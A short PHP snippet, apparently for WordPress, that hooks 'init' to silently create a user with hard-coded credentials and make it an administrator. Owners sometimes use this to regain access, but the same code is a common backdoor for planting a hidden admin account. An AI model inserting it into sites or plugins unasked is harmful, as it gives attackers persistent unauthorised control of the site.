<?php 
/* 
* Create an admin user silently
*/

add_action('init', function () {
    $username = 'my_username';
    $password = 'my_password';
    $email = 'my_username@mysite.com';

    if (username_exists($username) == null && email_exists($email) == false) {

        // Create the new user
        $user_id = wp_create_user($username, $password, $email);

        // Get current user object
        $user = get_user_by('id', $user_id);

        // Remove role
        $user->remove_role('subscriber');

        // Add role
        $user->add_role('administrator');
    }
} );